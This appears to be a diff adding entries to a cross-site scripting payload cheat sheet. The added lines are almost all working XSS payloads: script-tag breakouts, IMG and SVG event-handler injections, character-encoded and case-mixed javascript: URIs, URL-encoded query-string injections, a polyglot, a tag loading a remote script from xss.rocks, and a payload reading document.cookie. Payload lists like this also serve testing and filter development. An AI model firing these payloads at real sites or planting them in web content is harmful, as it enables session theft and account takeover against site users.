@@ -214,5 +214,46 @@ window.postMessage('alert(document.domain','*')
 
 window.postMessage({"action": "exec", "payload": "alert(document.domain)"}, '*')
 
+{{{</script><script>alert(1)</script>
+
+<SCRIPT SRC=http://xss.rocks/xss.js></SCRIPT>
+
+javascript:/*--></title></style></textarea></script></xmp>
+
+<svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'>
+
+<IMG SRC="javascript:alert('XSS');">
+
+<IMG SRC=javascript:alert('XSS')>
+
+<IMG SRC=JaVaScRiPt:alert('XSS')>
+
+<IMG SRC=javascript:alert(&quot;XSS&quot;)>
+
+<IMG """><SCRIPT>alert("XSS")</SCRIPT>"\>
+
+<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>
+
+<IMG SRC=# onmouseover="alert('xxs')">
+
+<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>
+
+<IMG SRC="jav&#x0D;ascript:alert('XSS');">
+
+http://example.com/search?q=%253Cscript%253Ealert('XSS')%253C%252Fscript%253E
+
+http://example.com/search?q=<script>alert(%00'XSS')</script>
+
+http://example.com/search?q^<script>alert('XSS')</script>
+
+http://example.com/search?q=%3Cscript%3Ealert(%00'XSS')%3C%2Fscript%3E
+
+https://github.com/0xsobky/HackVault/wiki/Unleashing-an-Ultimate-XSS-Polyglot
+
+https://www.bugcrowd.com/blog/the-ultimate-guide-to-finding-and-escalating-xss-bugs/
+
+">]<img src=x onerror=alert(document.domain)> ">]<img src=x onerror=alert(document.cookie)>
+
+
 ```
 
